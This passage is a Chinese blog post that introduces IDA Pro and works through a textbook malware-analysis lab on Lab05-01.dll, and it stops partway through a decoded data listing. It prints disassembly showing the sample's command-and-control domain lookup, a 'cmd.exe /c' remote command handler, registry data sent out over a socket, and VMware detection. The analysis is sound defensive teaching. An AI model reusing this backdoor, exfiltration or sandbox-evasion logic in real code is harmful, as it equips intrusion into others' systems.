    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>IDA Pro（交互式反汇编器专业版）是一款极其强大的反汇编器，是许多恶意代码分析师、逆向工程师和漏洞分析师的首选。</p><p><strong>IDA Pro接口：</strong></p><p>图形接口：</p><ul><li>文本模式：文本模式左侧部分被称为箭头窗口，显示了程序的非线性流程，实线标记的是无条件跳转，虚线标记了条件跳转，向上的箭头表示一个循环。</li><li>图形模式：图形模式中，箭头的颜色和方向显示程序的流程，红色表示一个条件跳转没有被采用，绿色表示这个条件跳转被采用，蓝色表示一个无条件跳转被采用，向上的箭头同样表示一个循环条件。</li></ul><p><strong>IDA窗口分布：</strong>函数窗口：列举可执行文件中的所有函数，并显示每个函数的长度。你可以根据函数长度进行排序来筛选出一些规模庞大而有趣的函数，这个窗口中每个函数关联了一些标志，如<code>L</code>代表此函数是库函数。</p><ul><li>名称窗口：列举每个地址的名字，包括函数、命名代码、命名数据、字符串。</li><li>字符串窗口：显示所有字符串，默认显示长度超过5个字符的ASCII字符串，可以通过右键字符串窗口并选择Setup来修改此属性。</li><li>导入表窗口：列举一个文件的所有导入函数。</li><li>导出表窗口：列举一个文件的所有导出函数，一般多用于分析DLL文件。</li><li>结构窗口：列举所有的活跃数据的结构布局。</li></ul><span id="more"></span><p><strong>使用链接和交叉引用：</strong>IDA中有常见的几个链接类型：</p><ul><li>子链接：一根函数开始的链接，如<code>printf</code></li><li>本地链接：跳转指令目的地址的链接，如<code>loc_40107E</code></li><li>偏移链接：内存偏移的链接</li></ul><p><strong>导航栏：</strong>导航栏包括一个以颜色伪代号的被加载的二进制地址空间的线性视图，其对应关系可在下方图例中找到。</p><p><img src="https://i.loli.net/2019/03/04/5c7d129402317.png"></p><p><strong>跳转到指定位置：</strong>在反汇编窗口中点击<code>G</code>键并在弹出的对话框中输入要跳转的虚拟内存地址或命名的位置即可跳转到目标地址。</p><p><strong>使用交叉引用：</strong>交叉引用在IDA Pro中称为<code>xref</code>，可以告诉你一个函数在何处被调用，或者一个字符串在何处被使用，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:1000D02E ; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>.text:1000D02E _DllMain@12     proc near               ; CODE XREF: DllEntryPoint+4B↓p<br>.text:1000D02E                                         ; DATA XREF: sub_100110FF+2D↓o<br>.text:1000D02E<br>.text:1000D02E hinstDLL        = dword ptr  4<br>.text:1000D02E fdwReason       = dword ptr  8<br>.text:1000D02E lpvReserved     = dword ptr  0Ch<br></code></pre></td></tr></table></figure><p>在默认情况下，IDA Pro只显示给定函数的少数交叉引用。要查看一个函数的多有交叉引用，单击函数名并按<code>X</code>键，弹出的窗口会列举这个函数所有被调用的位置。</p><p><strong>函数重命名：</strong>IDA在自动命名虚拟地址和栈变量方面做的很好，但是用户也可以手动修改这些自动生成的名字来使得分析过程更加便捷。</p><p><strong>注释：</strong>将光标放在反汇编的某行上，并按冒号键<code>:</code>便会弹出一个注释窗口。</p><p><strong>重新定义代码和数据：</strong>有时候IDA可能会错误的识别字节，比如把数据识别为代码，这时你可以按<code>C</code>键定义原始字节为代码，并通过<code>D</code>键和<code>A</code>键将这些字节定义为数据或者ASCII字符串。</p><p><strong>IDA插件：</strong>IDA支持IDC脚本和Python脚本：</p><ul><li>IDC脚本是IDA内置的脚本语言，其中所有的函数都被声明为静态函数，参数不需要指定类型，<code>auto</code>被用来定义全局变量。</li><li>IDAPython提供三个模块来访问IDA API（<code>idaapi</code>）、IDC接口（<code>idc</code>）、以及IDAPython工具函数（<code>idautils</code>）。</li></ul><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab5-1"><a href="#Lab5-1" class="headerlink" title="Lab5-1"></a>Lab5-1</h3><p><strong>只用IDA Pro分析在文件Lab05-01.dll中发现的恶意代码。这个实验的目标是给你一个用IDA Pro动手的经验。如果你已经用IDA Pro工作过，你可以选择忽略这些问题，而将精力集中在恶意代码上。</strong></p><p><strong>问题</strong></p><p><strong>1.DllMain的地址是什么</strong>。</p><p>双击<code>DllMain</code>即可看到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:1000D02E ; BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>.text:1000D02E _DllMain@12     proc near               ; CODE XREF: DllEntryPoint+4B↓p<br>.text:1000D02E                                         ; DATA XREF: sub_100110FF+2D↓o<br>.text:1000D02E<br>.text:1000D02E hinstDLL        = dword ptr  4<br>.text:1000D02E fdwReason       = dword ptr  8<br>.text:1000D02E lpvReserved     = dword ptr  0Ch<br></code></pre></td></tr></table></figure><p><code>0x1000D02E</code></p><p><strong>2.使用Imports窗口并浏览到gethostbyname，导入函数定位到什么地址？</strong></p><p>在Imports窗口双击该函数即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.idata:100163CC ; struct hostent *__stdcall gethostbyname(const char *name)<br>.idata:100163CC                 extrn gethostbyname:dword<br>.idata:100163CC                                         ; CODE XREF: sub_10001074:loc_100011AF↑p<br>.idata:100163CC                                         ; sub_10001074+1D3↑p ...<br></code></pre></td></tr></table></figure><p><code>0x100163CC</code> </p><p><strong>3.有多少函数调用了gethostbyname？</strong></p><p>通过查看调用关系能查出有5个函数调用了此函数</p><p><img src="https://i.loli.net/2019/03/05/5c7dc36128a5d.png"></p><p><strong>4.将精力集中在位于0x10001757处的对gethostbyname的调用，你能找出哪个DNS请求将被触发吗？</strong></p><p>在call指令之前找到参数入栈，双击<code>off_10019040</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:1000174E                 mov     eax, off_10019040<br>.text:10001753                 add     eax, 0Dh<br>.text:10001756                 push    eax             ; name<br>.text:10001757                 call    ds:gethostbyname<br></code></pre></td></tr></table></figure><p>即可找到DNS请求的域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:10019040 off_10019040    dd offset aThisIsRdoPicsP<br>.data:10019040                                         ; DATA XREF: sub_10001656:loc_10001722↑r<br>.data:10019040                                         ; sub_10001656+F8↑r ...<br>.data:10019040                                         ; &quot;[This is RDO]pics.praticalmalwareanalys&quot;...<br></code></pre></td></tr></table></figure><p><code>pics.praticalmalwareanalys.com</code></p><p><strong>5.IDA Pro识别了在0x10001656处的子过程的多少个局部变量？</strong></p><p>F5大法好，看到如下结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">10001656</span> var_675         = byte ptr <span class="hljs-number">-675</span>h<br>.text:<span class="hljs-number">10001656</span> var_674         = dword ptr <span class="hljs-number">-674</span>h<br>.text:<span class="hljs-number">10001656</span> hModule         = dword ptr <span class="hljs-number">-670</span>h<br>.text:<span class="hljs-number">10001656</span> timeout         = timeval ptr <span class="hljs-number">-66</span>Ch<br>.text:<span class="hljs-number">10001656</span> name            = sockaddr ptr <span class="hljs-number">-664</span>h<br>.text:<span class="hljs-number">10001656</span> var_654         = word ptr <span class="hljs-number">-654</span>h<br>.text:<span class="hljs-number">10001656</span> Dst             = dword ptr <span class="hljs-number">-650</span>h<br>.text:<span class="hljs-number">10001656</span> Str1            = byte ptr <span class="hljs-number">-644</span>h<br>.text:<span class="hljs-number">10001656</span> var_640         = byte ptr <span class="hljs-number">-640</span>h<br>.text:<span class="hljs-number">10001656</span> CommandLine     = byte ptr <span class="hljs-number">-63F</span>h<br>.text:<span class="hljs-number">10001656</span> Str             = byte ptr <span class="hljs-number">-63</span>Dh<br>.text:<span class="hljs-number">10001656</span> var_638         = byte ptr <span class="hljs-number">-638</span>h<br>.text:<span class="hljs-number">10001656</span> var_637         = byte ptr <span class="hljs-number">-637</span>h<br>.text:<span class="hljs-number">10001656</span> var_544         = byte ptr <span class="hljs-number">-544</span>h<br>.text:<span class="hljs-number">10001656</span> var_50C         = dword ptr <span class="hljs-number">-50</span>Ch<br>.text:<span class="hljs-number">10001656</span> var_500         = byte ptr <span class="hljs-number">-500</span>h<br>.text:<span class="hljs-number">10001656</span> Buf2            = byte ptr <span class="hljs-number">-4F</span>Ch<br>.text:<span class="hljs-number">10001656</span> readfds         = fd_set ptr <span class="hljs-number">-4B</span>Ch<br>.text:<span class="hljs-number">10001656</span> buf             = byte ptr <span class="hljs-number">-3B</span>8h<br>.text:<span class="hljs-number">10001656</span> var_3B0         = dword ptr <span class="hljs-number">-3B</span>0h<br>.text:<span class="hljs-number">10001656</span> var_1A4         = dword ptr <span class="hljs-number">-1</span>A4h<br>.text:<span class="hljs-number">10001656</span> var_194         = dword ptr <span class="hljs-number">-194</span>h<br>.text:<span class="hljs-number">10001656</span> WSAData         = WSAData ptr <span class="hljs-number">-190</span>h<br>.text:<span class="hljs-number">10001656</span> lpThreadParameter= dword ptr  <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>所以因该是23个局部变量。</p><p><strong>6.IDA Pro识别了在0x10001656处的子过程的多少个参数？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">10001656</span> lpThreadParameter= dword ptr  <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>1个参数</p><p><strong>7.使用string窗口，来在反汇编中定位字符串\cmd.exe &#x2F;c。它位于哪？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">xdoors_d:<span class="hljs-number">10095B</span>34 aCmdExeC        db <span class="hljs-string">&#x27;\cmd.exe /c &#x27;</span>,<span class="hljs-number">0</span>     ; DATA XREF: sub_1000FF58+<span class="hljs-number">278</span>↑o<br></code></pre></td></tr></table></figure><p><code>0x10095B34</code></p><p><strong>8.在引用\cmd.exe &#x2F;c的代码区域发生了什么？</strong></p><p>先通过双击XREF找到引用位置可发现如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:100101C8                 cmp     dword_1008E5C4, ebx<br>.text:100101CE                 jz      short loc_100101D7<br>.text:100101D0                 push    offset aCmdExeC ; &quot;\\cmd.exe /c &quot;<br>.text:100101D5                 jmp     short loc_100101DC<br>.text:100101D7 loc_100101D7:                           ; CODE XREF: sub_1000FF58+276↑j<br>.text:100101D7                 push    offset aCommandExeC ; &quot;\\command.exe /c &quot;<br></code></pre></td></tr></table></figure><p><code>cmd.exe /c</code>命令可以在执行完命令之后关闭CMD窗口，因此这应该是个命令执行，且父函数的参数是<code>SOCKET s</code>，且函数后半部分有大量的<code>cmp</code>指令来跟一系列的指令比较，因此猜测这个函数是一个实现远程命令执行的函数。</p><p><strong>9.在同样的区域，在0x100101C8处，看起来好像dword_1008E5C4是一个全局变量，他帮助你决定走哪条路径。那恶意代码是如何设置dword_1008E5C4的呢？（提示：使用dword_1008E5C4的交叉引用）</strong></p><p>通过查看<code>dword_1008E5C4</code>的交叉引用，发现如下信息</p><p><img src="https://i.loli.net/2019/03/05/5c7ddf18a7061.png"></p><p>第一条数据显示了一个赋值操作，因此双击第一条，可以发现<code>dword_1008E5C4</code>的值为函数<code>sub_10003695()</code>的返回值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( !sub_10001000() )<br>  &#123;<br>    v39 = <span class="hljs-number">0</span>;<br>    hModule = <span class="hljs-number">0</span>;<br>    dword_1008E5C4 = sub_10003695();<br>    dword_1008E5C8 = sub_100036C3();<br>    Sleep(<span class="hljs-number">0x3A98</span>u);<br>    sub_100110FF();<br></code></pre></td></tr></table></figure><p>因此查看一下函数<code>sub_10003695()</code>的内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL <span class="hljs-title function_">sub_10003695</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">OSVERSIONINFOA</span> <span class="hljs-title">VersionInformation</span>;</span> <span class="hljs-comment">// [esp+0h] [ebp-94h]</span><br><br>  VersionInformation.dwOSVersionInfoSize = <span class="hljs-number">148</span>;<br>  GetVersionExA(&amp;VersionInformation);<br>  <span class="hljs-keyword">return</span> VersionInformation.dwPlatformId == <span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此<code>dword_1008E5C4</code>为<code>VersionInformation.dwPlatformId == 2</code>的值，1或0。</p><p><strong>10.在位于0x1000FF58处的子过程的几百行指令中，一系列使用memcmp来比较字符串的比较。如果对robotwork的字符串比较是成功的（当memcmp返回0），会发生什么？</strong></p><p>找到指定位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10010444 loc_10010444:                           ; CODE XREF: sub_1000FF58+4E0↑j<br>.text:10010444                 push    9               ; Size<br>.text:10010446                 lea     eax, [ebp+Dst]<br>.text:1001044C                 push    offset aRobotwork ; &quot;robotwork&quot;<br>.text:10010451                 push    eax             ; Buf1<br>.text:10010452                 call    memcmp<br>.text:10010457                 add     esp, 0Ch<br>.text:1001045A                 test    eax, eax<br>.text:1001045C                 jnz     short loc_10010468<br>.text:1001045E                 push    [ebp+s]         ; s<br>.text:10010461                 call    sub_100052A2<br>.text:10010466                 jmp     short loc_100103F6<br></code></pre></td></tr></table></figure><p>如果<code>memecmp()</code>函数返回0，则<code>jnz</code>不执行，程序将执行函数<code>sub_100052A2</code>，函数<code>sub_100052A2</code>是一个数据库查询函数，查询了<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Worktime</code>和<code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Worktimes</code>的值。然后再通过<code>sub_100038EE</code>函数将查询的结果发送出去。</p><p><strong>11.PSLIST导出函数做了什么？</strong></p><p>函数伪C代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __userpurge PSLIST@&lt;eax&gt;(<span class="hljs-type">char</span> a1@&lt;sil&gt;, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3, <span class="hljs-type">char</span> *Str, <span class="hljs-type">int</span> a5)<br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br><br>  dword_1008E5BC = <span class="hljs-number">1</span>;<br>  result = sub_100036C3();<br>  <span class="hljs-keyword">if</span> ( result )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) )<br>      result = sub_1000664C(a1, <span class="hljs-number">0</span>, Str);<br>    <span class="hljs-keyword">else</span><br>      result = sub_10006518();<br>  &#125;<br>  dword_1008E5BC = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，函数<code>sub_100036C3()</code>用于判断操作系统和操作系统版本，当操作系统版本符合要求时，程序通过CreatToolhelp32Snapshot函数来获取当前正在运行的进程的列表，结合导出函数的名字我们可以得知这是一个获取计算机运行进程列表的函数。</p><p><strong>12.使用图模式来绘制出对sub_10004E79的交叉引用图。当进入这个函数时，哪个API函数可能被调用？仅仅基于这些API函数，你会如何重命名这个函数？</strong></p><p><img src="https://i.loli.net/2019/03/05/5c7dea0d9beb1.png"></p><p>API函数如图粉色方块内容。</p><p><code>getSysLang</code></p><p><strong>13.DllMain直接调用了多少个Windows API？多少个在深度为2时被调用？</strong></p><p>本题。。。卒</p><p><img src="https://i.loli.net/2019/03/05/5c7e67cfae8ea.png"></p><p><strong>14.在0x10001358处，有一个对Sleep（一个使用一个包含要睡眠的毫秒数的参数的API函数）的调用。顺着代码向后看，如果这段代码执行，这个程序会睡眠多久？</strong></p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:10001341                 mov     eax, off_10019020<br>.text:10001346                 add     eax, 0Dh<br>.text:10001349                 push    eax             ; Str<br>.text:1000134A                 call    ds:atoi<br>.text:10001350                 imul    eax, 3E8h<br>.text:10001356                 pop     ecx<br>.text:10001357                 push    eax             ; dwMilliseconds<br>.text:10001358                 call    ds:Sleep<br>.text:1000135E                 xor     ebp, ebp<br>.text:10001360                 jmp     loc_100010B4<br>.text:10001360 sub_10001074    endp<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/06/5c7f3a8e45cd4.png"></p><p>因此指令<code>add eax, 0Dh</code>执行之后<code>EAX</code>的值为30，因此<code>Sleep</code>函数为<code>Sleep(30*1000)</code>，因此程序会睡眠30秒。</p><p><strong>15.在0x10001701处是一个随socket的调用。它的三个参数是什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:100016FB loc_100016FB:                           ; CODE XREF: sub_10001656+374↓j<br>.text:100016FB                                         ; sub_10001656+A09↓j<br>.text:100016FB                 push    6               ; protocol<br>.text:100016FD                 push    1               ; type<br>.text:100016FF                 push    2               ; af<br>.text:10001701                 call    ds:socket<br>.text:10001707                 mov     edi, eax<br>.text:10001709                 cmp     edi, 0FFFFFFFFh<br>.text:1000170C                 jnz     short loc_10001722<br>.text:1000170E                 call    ds:WSAGetLastError<br>.text:10001714                 push    eax<br>.text:10001715                 push    offset aSocketGetlaste ; &quot;socket() GetLastError reports %d\n&quot;<br>.text:1000171A                 call    ds:__imp_printf<br>.text:10001720                 pop     ecx<br>.text:10001721                 pop     ecx<br></code></pre></td></tr></table></figure><p>IDA给出的参数名为<code>af</code>、<code>type</code>、<code>protocol</code>，值分别为<code>2</code>、<code>1</code>、<code>6</code>。</p><p><strong>16.使用MSDN页面的socket和IDA Pro中的命名符号常量，你能使参数更加有意义吗？在你应用了修改以后，参数是什么？</strong></p><p><code>AF_INET</code>、<code>SOCK_STREAM</code>、<code>IPPROTO_TCP</code></p><p><strong>17.搜索in指令（opcode 0xED）的使用。这个指令和一个魔术字符串VMXh用来进行VMware检测。在这个恶意代码中被使用了吗？使用对执行in指令函数的交叉引用，能发现进一步检测VMware的证据吗？</strong></p><p>再IDA中选择Search-&gt;sequence of bytes，输入ED然后选择搜索所有结果，再搜索结果中能找到一个in指令：</p><p><img src="https://i.loli.net/2019/03/06/5c7f4f3de495a.png"></p><p><img src="https://i.loli.net/2019/03/06/5c7f4fc6da955.png"></p><p>右键选择<code>564D5868h</code>，可以看到此数据的ASCII码是<code>VMXh</code></p><p><img src="https://i.loli.net/2019/03/06/5c7f4fea15186.png"></p><p>查看此函数的交叉引用可以看到如下几个相同的调用;</p><p><img src="https://i.loli.net/2019/03/06/5c7f518b60a12.png"></p><p>查看后发现如下字符串：</p><p><img src="https://i.loli.net/2019/03/06/5c7f51d7746b5.png"></p><p><strong>18.将你的光标跳转到0x1001D988处，你发现了什么？</strong></p><p>发现了一些ASCII码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:1001D988                 db  2Dh ; -<br>.data:1001D989                 db  31h ; 1<br>.data:1001D98A                 db  3Ah ; :<br>.data:1001D98B                 db  3Ah ; :<br>.data:1001D98C                 db  27h ; &#x27;<br>.data:1001D98D                 db  75h ; u<br>.data:1001D98E                 db  3Ch ; &lt;<br>.data:1001D98F                 db  26h ; &amp;<br>.data:1001D990                 db  75h ; u<br>.data:1001D991                 db  21h ; !<br>.data:1001D992                 db  3Dh ; =<br>.data:1001D993                 db  3Ch ; &lt;<br>.data:1001D994                 db  26h ; &amp;<br>.data:1001D995                 db  75h ; u<br>.data:1001D996                 db  37h ; 7<br>.data:1001D997                 db  34h ; 4<br>.data:1001D998                 db  36h ; 6<br>.data:1001D999                 db  3Eh ; &gt;<br>.data:1001D99A                 db  31h ; 1<br>.data:1001D99B                 db  3Ah ; :<br>.data:1001D99C                 db  3Ah ; :<br>.data:1001D99D                 db  27h ; &#x27;<br>.data:1001D99E                 db  79h ; y<br>.data:1001D99F                 db  75h ; u<br>.data:1001D9A0                 db  26h ; &amp;<br>.data:1001D9A1                 db  21h ; !<br>.data:1001D9A2                 db  27h ; &#x27;<br>.data:1001D9A3                 db  3Ch ; &lt;<br>.data:1001D9A4                 db  3Bh ; ;<br>.data:1001D9A5                 db  32h ; 2<br>.data:1001D9A6                 db  75h ; u<br>.data:1001D9A7                 db  31h ; 1<br>.data:1001D9A8                 db  30h ; 0<br>.data:1001D9A9                 db  36h ; 6<br>.data:1001D9AA                 db  3Ah ; :<br>.data:1001D9AB                 db  31h ; 1<br>.data:1001D9AC                 db  30h ; 0<br>.data:1001D9AD                 db  31h ; 1<br>.data:1001D9AE                 db  75h ; u<br>.data:1001D9AF                 db  33h ; 3<br>.data:1001D9B0                 db  3Ah ; :<br>.data:1001D9B1                 db  27h ; &#x27;<br>.data:1001D9B2                 db  75h ; u<br>.data:1001D9B3                 db    5<br>.data:1001D9B4                 db  27h ; &#x27;<br>.data:1001D9B5                 db  34h ; 4<br>.data:1001D9B6                 db  36h ; 6<br>.data:1001D9B7                 db  21h ; !<br>.data:1001D9B8                 db  3Ch ; &lt;<br>.data:1001D9B9                 db  36h ; 6<br>.data:1001D9BA                 db  34h ; 4<br>.data:1001D9BB                 db  39h ; 9<br>.data:1001D9BC                 db  75h ; u<br>.data:1001D9BD                 db  18h<br>.data:1001D9BE                 db  34h ; 4<br>.data:1001D9BF                 db  39h ; 9<br>.data:1001D9C0                 db  22h ; &quot;<br>.data:1001D9C1                 db  34h ; 4<br>.data:1001D9C2                 db  27h ; &#x27;<br>.data:1001D9C3                 db  30h ; 0<br>.data:1001D9C4                 db  75h ; u<br>.data:1001D9C5                 db  14h<br>.data:1001D9C6                 db  3Bh ; ;<br>.data:1001D9C7                 db  34h ; 4<br>.data:1001D9C8                 db  39h ; 9<br>.data:1001D9C9                 db  2Ch ; ,<br>.data:1001D9CA                 db  26h ; &amp;<br>.data:1001D9CB                 db  3Ch ; &lt;<br>.data:1001D9CC                 db  26h ; &amp;<br>.data:1001D9CD                 db  75h ; u<br>.data:1001D9CE                 db  19h<br>.data:1001D9CF                 db  34h ; 4<br>.data:1001D9D0                 db  37h ; 7<br>.data:1001D9D1                 db  75h ; u<br>.data:1001D9D2                 db  6Fh ; o<br>.data:1001D9D3                 db  7Ch ; |<br>.data:1001D9D4                 db  64h ; d<br>.data:1001D9D5                 db  67h ; g<br>.data:1001D9D6                 db  66h ; f<br>.data:1001D9D7                 db  61h ; a<br></code></pre></td></tr></table></figure><p><strong>19，如果你安装了IDA Python插件（包括IDA Pro的商业版本插件），运行Lab05-01.py，一个本书中随恶意代码提供的IDA Pro Python脚本，（确定光标是在0x1001D988处。）你运行这个脚本后发生了什么？</strong></p><p>运行此脚本后发现同一位置的数据发生了变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:1001D988                 db  78h ; x<br>.data:1001D989                 db  64h ; d<br>.data:1001D98A                 db  6Fh ; o<br>.data:1001D98B                 db  6Fh ; o<br>.data:1001D98C                 db  72h ; r<br>.data:1001D98D                 db  